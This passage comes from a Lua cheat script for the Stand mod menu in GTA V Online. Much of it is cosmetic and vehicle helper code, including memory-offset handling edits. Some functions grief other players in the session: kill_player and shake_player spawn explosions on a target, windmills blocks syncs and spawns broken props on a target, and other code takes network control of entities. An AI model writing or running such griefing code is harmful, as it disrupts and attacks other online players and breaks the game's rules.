        VEHICLE.SET_VEHICLE_MOD(vmod, 23, wheel)
        VEHICLE.SET_VEHICLE_MOD(vmod, 24, wheel)
    else
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vmod, wtype)
        VEHICLE.SET_VEHICLE_MOD(vmod, 23, wheel)
    end
end
function Changetint(pid, tint)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = GetSpec(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    VEHICLE.SET_VEHICLE_WINDOW_TINT(vmod, tint)
end
    function get_control_request(ent)
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            local tick = 0
            while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
                tick = tick + 1
                wait()
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            end
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            gtoast("Sin control de "..ent)
        end
        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
    end
function wait_session_transition(yield_time)
    yield_time = yield_time or 1000
    while util.is_session_transition_active() do
        wait(yield_time)
    end
end
function handle_player_list(pid) 
    local ref = GTLuaScript[pid]
    if not players.exists(pid) then
        if ref then
            GTLuaScript.delete(ref)
            GTLuaScript[pid] = nil
        end
    end
end
function RequestControlOfEnt(entity)
	local tick = 0
	local tries = 0
	NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick <= 1000 do
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		tick = tick + 1
		tries = tries + 1
		if tries == 50 then 
			wait()
			tries = 0
		end
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end
function T(text)
    if type(Hexarobi_translate) == "function" then
        return Hexarobi_translate(text)
    else
        return text
    end
end
--激光眼
function laser_eyes()
    local weaponHash = util.joaat("weapon_heavysniper_mk2")
    local dictionary = "weap_xs_weapons"
    local ptfx_name = "bullet_tracer_xs_sr"
    local camRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
    if PAD.IS_CONTROL_PRESSED(51, 51) then
        local inst = v3.new()
        v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
        local tmp = v3.toDir(inst)
        v3.set(inst, v3.get(tmp))
        v3.mul(inst, 1000)
        v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
        v3.add(inst, tmp)
        camAim_x, camAim_y, camAim_z = v3.get(inst)
        local ped_model = ENTITY.GET_ENTITY_MODEL(players.user_ped())
        local left_eye_id = 0
        local right_eye_id = 0
        pluto_switch ped_model do 
            case 1885233650:
            case -1667301416:
                left_eye_id = 25260
                right_eye_id = 27474
                break
            case 225514697:
            default:
                left_eye_id = 5956
                right_eye_id = 6468
        end
        local boneCoord_L = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), left_eye_id))
        local boneCoord_R = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), right_eye_id))
        if ped_model == util.joaat("mp_f_freemode_01") then 
            boneCoord_L.z += 0.02
            boneCoord_R.z += 0.02
        end
        camRot.x += -90
        request_ptfx_asset_lasereyes(dictionary)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
    end
end
-- 摇头丸
function request_control_of_entity_once(ent)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and util.is_session_started() then
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ent)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
    end
end
local cur_state = 1
function yaoptou()
    local all_peds = entities.get_all_peds_as_handles()
    for k, ped in pairs(all_peds) do
        if not PED.IS_PED_A_PLAYER(ped) then
            request_control_of_entity_once(ped)
            TASK.CLEAR_PED_TASKS(ped)
            local c
            if cur_state == 1 then
                c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 1.0, 10.0)
            else
                c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 1.0, -10.0)
            end
            TASK.TASK_LOOK_AT_COORD(ped, c.x, c.y, c.z, -1, 0, 2)
        end
    end
    if cur_state == 1 then
        cur_state = 2
    else
        cur_state = 1
    end
    wait(100)
end
--阻止传出同步的信息
function BlockSyncs(pid, callback)
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "on")
		end
	end
	wait(10)
	callback()
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "off")
		end
	end
end
--大风车
function windmills(pid)
    BlockSyncs(pid, function()
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        wait(1000)
        entities.delete_by_handle(object)
    end)
end
--震动屏幕
function shake_player(pid, power)
    local entity = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 7, 0, false, true, power)
end
--恢复模型
function restore_model()
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
        menu.trigger_commands("walkstyle normal")
    else
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("walkstyle normal")
    end
end
--飘移
player_cur_car = 0
function get_vehicle_handling_value(veh, offset)
    local v_ptr = entities.handle_to_pointer(veh)
    local handling = memory.read_long(v_ptr + 0x918)
    return memory.read_float(handling + offset)
end
function set_vehicle_handling_value(veh, offset, value)
    local v_ptr = entities.handle_to_pointer(veh)
    local handling = memory.read_long(v_ptr + 0x918)
    memory.write_float(handling + offset, value)
end
last_vehicle_handling_data = {}
function set_vehicle_into_drift_mode(veh)
    local handling_values = {
        [0x0C] = 1900.0, -- fmass
        [0x20] = 0.0, -- vec com off x
        [0x24] = 0.0, -- vec com off y
        [0x28] = 0.0, -- vec com off z
        [0x30] = 1.0, -- vec inertia mult x
        [0x34] = 1.0, -- vec inertia mult y
        [0x38] = 1.0, -- vec inertia mult z
        [0x10] = 15.5, -- initial drag coeff
        [0x40] = 85.0, -- percent submerged
        [0x48] = 0.0,-- drive bias front
        [0x50] = 0.0,-- initial drive gears
        [0x60] = 1.9,-- initial drive force
        [0x54] = 1.0,-- fdrive interia
        [0x58] = 5.0,-- clutch change rate scale up
        [0x5C] = 5.0,-- clutch change rate scale down
        [0x68] = 200.0, -- initial drive max flat vel
        [0x6C] = 4.85, --  brake force
        [0x74] = 0.67, -- brake bias front
        [0x7C] = 3.5, -- handbrake force
        [0x80] = 1.2, -- steering lock
        [0x88] = 1.0, -- traction curve max
        [0x88] = 1.45, -- traction curve min
        [0x98] = 35.0, -- traction curve lateral
        [0xA0] = 0.15, -- traction curve spring delta max
        [0xA8] = 0.0, -- low speed traction loss mult
        [0xAC] = 0.0, -- camber stiffness
        [0xB0] = 0.45, -- traction bias front
        [0xB8] = 1.0, -- traction loss mult
        [0xBC] = 2.8, -- suspension force
        [0xC0] = 1.4, -- suspension comp damp
        [0xC4] = 2.2, -- suspension rebound damp
        [0xC8] = 0.06, -- suspension upper limit
        [0xCC] = -0.05, -- suspension lower limit
        [0xBC] = 2.8, -- suspension force
        [0xD0] = 0.0, -- suspension raise
        [0xD4] = 0.5, -- suspension bias front
        [0xD4] = 0.5, -- suspension bias front
    }
    for offset, value in pairs(handling_values) do 
        last_vehicle_handling_data[offset] = get_vehicle_handling_value(veh, offset)
        set_vehicle_handling_value(veh, offset, value)
    end
end
initial_d_mode = false
initial_d_score = false
function on_user_change_vehicle(vehicle)
    if vehicle ~= 0 then
        if initial_d_mode then 
            set_vehicle_into_drift_mode(vehicle)
        end
        local deez_nuts = {}
        local num_seats = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(vehicle))
        for i=1, num_seats do
            if num_seats >= 2 then
                deez_nuts[#deez_nuts + 1] = tostring(i - 2)
            else
                deez_nuts[#deez_nuts + 1] = tostring(i)
            end
        end
        if true then 
            native_invoker.begin_call()
            native_invoker.push_arg_int(vehicle)
            native_invoker.end_call("76D26A22750E849E")
        end
    end
end
function initial_d_score_thread()
    util.create_thread(function()
        local drift_score = 0
        local is_drifting = false
        while true do
            if not initial_d_mode or not initial_d_score then 
                util.stop_thread()
            end
            if player_cur_car ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then 
                if math.abs(ENTITY.GET_ENTITY_SPEED_VECTOR(player_cur_car, true).x) > 2 then 
                    is_drifting = true
                    drift_score = drift_score + 1
                    local c = ENTITY.GET_ENTITY_COORDS(player_cur_car)
                    c.z = c.z + 0.3
                    local score_pos = world_to_screen_coords(c.x, c.y, c.z)
                    directx.draw_text(score_pos.x, score_pos.y, "漂移分数: " .. tostring(drift_score), 5, 1, {r=1, g= 0.5, b = 0.4, a = 100}, true)
                else
                    if is_drifting then
                        is_drifting = false
                        gtoast("总漂移得分: " .. drift_score)
                    end
                    drift_score = 0
                end
            end
            wait()
        end
    end)
end
--相机方向推力
thrust_cam_dir_add = 1.25
before_vel = {x = 1, y = 1, z = 1}
function cam_direction()
local camRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
local inst = v3.new()
v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
local tmp = v3.toDir(inst)
v3.set(inst, v3.get(tmp))
v3.mul(inst, 10)
v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
v3.add(inst, tmp)
local aim_pos = inst
local car_pos = ENTITY.GET_ENTITY_COORDS(player_cur_car)
local c = {}
c.x = before_vel.x+thrust_cam_dir_add + (aim_pos.x - car_pos.x)
c.y = before_vel.y+thrust_cam_dir_add + (aim_pos.y - car_pos.y)
ENTITY.SET_ENTITY_VELOCITY(player_cur_car, c.x, c.y, -0.002)
end
--获取导航点
function get_waypoint_pos(callback, silent)
        if HUD.IS_WAYPOINT_ACTIVE() then
            local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
            local waypoint_pos = HUD.GET_BLIP_COORDS(blip)
            if callback then
                callback(waypoint_pos)
            end
            return waypoint_pos
        elseif not silent then
            notification("没有设置导航点")
            return nil
        end
    end
--GPS
b_common_funcs = {}
b_common_funcs.new = function ()
    local self = {}
    --credit to Nowiry#2663 and QuickNET#9999 for this one
    self.address_from_pointer_chain = function (basePtr, offsets)
        local addr = memory.read_long(basePtr)
        for k = 1, (#offsets - 1) do
            addr = memory.read_long(addr + offsets[k])
            if addr == 0 then
                return 0
            end
        end
        addr = addr + offsets[#offsets]
        return addr
    end
    self.get_player_vehicle_class = function ()
        local veh = entities.get_user_vehicle_as_handle()
        return VEHICLE.GET_VEHICLE_CLASS(veh)
    end
    self.get_ascpect_ratio = function()
        local screen_x, screen_y = directx.get_client_size()
        return screen_x / screen_y
    end
    self.to_bits = function(num)
        -- returns a table of bits, least significant first.
        local t={} -- will contain the bits
        while num>0 do
            rest=math.fmod(num,2)
            t[#t+1]=rest
            num=(num-rest)/2
        end
        return t
    end
    self.split = function (input, sep)
        local t={}
        for str in string.gmatch(input, "([^"..sep.."]+)") do
                table.insert(t, str)
        end
        return t
    end
    local minimum = memory.alloc()
    local maximum = memory.alloc()
    self.get_pos_above_entity = function (entity)
        MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), minimum, maximum)
        local maximum_vec = memory.read_vector3(maximum)
        return ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, 0, 0, maximum_vec.z)
    end
    self.copy_File = function(old_path, new_path)
        local old_file = io.open(old_path, "rb")
        local new_file = io.open(new_path, "wb")
        local old_file_sz, new_file_sz = 0, 0
        if not old_file or not new_file then
          return false
        end
        while true do
          local block = old_file:read(2^13)
          if not block then 
            old_file_sz = old_file:seek( "end" )
            break
          end
          new_file:write(block)
        end
        old_file:close()
        new_file_sz = new_file:seek( "end" )
        new_file:close()
        return new_file_sz == old_file_sz
      end
    return self
end
b_math_funcs = {}
b_math_funcs.new = function ()
    local self = {}
    self.lerp = function(a, b, t)
        return a + (b - a) * t
    end
    local EPSILON = 0.0000001
    self.RayIntersectsTriangle = function(rayOrigin, rayDirection, vertex1, vertex2, vertex3)
        local edge1, edge2, h, s, q, a, f, u, v
        edge1 = {x = vertex2.x - vertex1.x, y = vertex2.y - vertex1.y, z = vertex2.z - vertex1.z}
        edge2 = {x = vertex3.x - vertex1.x, y = vertex3.y - vertex1.y, z = vertex3.z - vertex1.z}
        h = {
            x =    edge2.y * rayDirection.z - edge2.z * rayDirection.y,
            y =    edge2.z * rayDirection.x - edge2.x * rayDirection.z,
            z =    edge2.x * rayDirection.y - edge2.y * rayDirection.x
        }
        a = h.x * edge1.x + h.y * edge1.y + h.z * edge1.z
        if a > -EPSILON and a < EPSILON then return false end
        f = 1.0/a
        s = {x = rayOrigin.x - vertex1.x, y = rayOrigin.y - vertex1.y, z = rayOrigin.z - vertex1.z}
        u = f * (h.x * s.x + h.y * s.y + h.z * s.z)
        if u < 0.0 or u > 1.0 then return false end
        q = {
            x =    edge1.y * s.z - edge1.z * s.y,
            y =    edge1.z * s.x - edge1.x * s.z,
            z =    edge1.x * s.y - edge1.y * s.x
        }
        v = f * (rayDirection.x * q.x + rayDirection.y * q.y + rayDirection.z * q.z)
        if v < 0.0 or u + v > 1.0 then return false end
        t = f *  (edge2.x * q.x + edge2.y * q.y + edge2.z * q.z)
        if t > EPSILON then
            return true, {
                x = rayOrigin.x + rayDirection.x * t,
                y = rayOrigin.y + rayDirection.y * t,
                z = rayOrigin.z + rayDirection.z * t
            }
        else
            return false
        end
    end
    return self
end
b_vectors = {}
b_vectors.new = function ()
    local self = {}
    self.vector2 = {}
    self.vector2.new = function (x, y)
        return {x = x, y = y}
    end
    self.vector2.dot = function(vector_a, vector_b)
        return (vector_a.x * vector_b.x) + (vector_a.y * vector_b.y)
    end
    self.vector2.magnitude = function(vector)
        return math.sqrt((vector.x * vector.x) + (vector.y * vector.y))
    end
    self.vector2.get_angle = function(vector_a, vector_b)
        return math.acos(self.vector2.dot(vector_a, vector_b) / self.vector2.magnitude(vector_a) / self.vector2.magnitude(vector_b))
    end
    self.vector3 = {}
    self.vector3.new = function (x, y, z)
        return {x = x, y = y, z = z}
    end
    self.vector3.add = function(a, b)
        return self.vector3.new(a.x + b.x, a.y + b.y, a.z + b.z)
    end
    self.vector3.sub = function(a, b)
        return self.vector3.new(a.x - b.x, a.y - b.y, a.z - b.z)
    end
    self.vector3.multiply = function (vec, num)
        return {x = vec.x * num, y = vec.y * num, z = vec.z * num}
    end
    return self
end
function get_waypoint_v3()
        if HUD.IS_WAYPOINT_ACTIVE() then
            local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
            local waypoint_pos = HUD.GET_BLIP_COORDS(blip)
            local success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
            local tries = 0
            while not success or tries <= 100 do
                success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
                tries += 1
                wait()
            end
            if success then
                waypoint_pos.z = Zcoord
            end
            return waypoint_pos
        else
            notification("傻B,你都没标点")
        end
    end
--宠物
function getgroupsize(group)
    local unkPtr, sizePtr = memory.alloc(1), memory.alloc(1)
    PED.GET_GROUP_SIZE(group, unkPtr, sizePtr)
    return memory.read_int(sizePtr)
end
mygroup = PLAYER.GET_PLAYER_GROUP(players.user())
dogs = table.freeze({
    "Rottweiler",
    "Husky",
    "Poodle",
    "Pug",
    "Retriever",
    "Westy",
    "Shepherd",
    "Cat_01",
})
doganimations = {
    "WORLD_DOG_SITTING_ROTTWEILER",
    "WORLD_DOG_SITTING_RETRIEVER",
    "WORLD_DOG_SITTING_SHEPHERD",
    "WORLD_DOG_SITTING_SMALL",
}
activedogs = {}
function GenerateNametagOnPed(ped, nametag)
    util.create_thread(function()
        while ENTITY.DOES_ENTITY_EXIST(ped) do
            local headpos = PED.GET_PED_BONE_COORDS(ped, 0x796e, 0,0,0)
            GRAPHICS.SET_DRAW_ORIGIN(headpos.x, headpos.y, headpos.z+0.4, 0)
            HUD.SET_TEXT_COLOUR(200,200,200,220)
            HUD.SET_TEXT_SCALE(1, 0.5)
            HUD.SET_TEXT_CENTRE(true)
            HUD.SET_TEXT_FONT(4)
            HUD.SET_TEXT_OUTLINE()
            HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
            HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(nametag)
            HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0,0,0)
            GRAPHICS.CLEAR_DRAW_ORIGIN()
            wait()
        end
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0,0,0)
        GRAPHICS.CLEAR_DRAW_ORIGIN()
    end)
end
function removeValues(t, removeT)
    for _, r in ipairs(removeT) do
        for i, v in ipairs(t) do
            if v == r then
                table.remove(t, i)
            end
        end
    end
end
function IsPlayerUsingOrbitalCannon(player)
    return BitTest(memory.read_int(memory.script_global((2657589 + (player * 466 + 1) + 427))), 0) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_427), 0
end
function pvpdefmode()
    for _, pid in ipairs(players.list(false, true, true)) do
        if PLAYER.IS_PLAYER_FREE_AIMING(pid) then
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, true)
        else 
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
        end
    end
end
    function get_hud_colour()
        local red_colour_ref = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Red")
        local green_colour_ref = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Green")
        local blue_colour_ref = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Blue")
        local alpha_colour_ref = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Opacity")
        local red = menu.get_value(red_colour_ref)
        local green = menu.get_value(green_colour_ref)
        local blue = menu.get_value(blue_colour_ref)
        local alpha = menu.get_value(alpha_colour_ref)
        return red, green, blue, alpha
    end
GTluaScript = menu
---
function kill_player(pid)
    local entity = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'] + 2, 7, 1000, false, true, 0)
    menu.trigger_commands("kill" .. players.get_name(pid))
end
protected_area_radius = 100
protected_areas = {}
protected_area_allow_friends = true
protected_areas_on = false
--背藏武器
function attachweapon(spawnweapon)
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 416676503) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 690389602) then
		ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.15, 0, 0.13, 270, 0, 0, false, true, false, false, 1, true)
	end
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -728555052) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -1609580060) then
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_bat")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.3, -0.18, -0.15, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_crowbar")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 90, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_battleaxe")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_golfclub")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hatchet")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_poolcue")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), -0.2, -0.18, 0.1, 0, 120, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stone_hatchet")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_knuckle")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 90, false, true, false, false, 1, true)
		end
		if not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_bat"))  and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_crowbar")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_battleaxe"))and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_golfclub")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hatchet")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_poolcue")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stone_hatchet")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_knuckle")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0, 0, 0.13, 0, 90, 270, false, true, false, false, 1, true)
		end
	end
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1548507267) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -37788308) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1595662460) then	
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_petrolcan")) or (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hazardcan")) or (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fertilizercan")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0, -0.18, -0, 0, 90, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_proxmine")) or (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stickybomb")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 0, 270, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fireextinguisher")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0, -0.05, 0.13, 0, 270, 90, false, true, false, false, 1, true)
		end
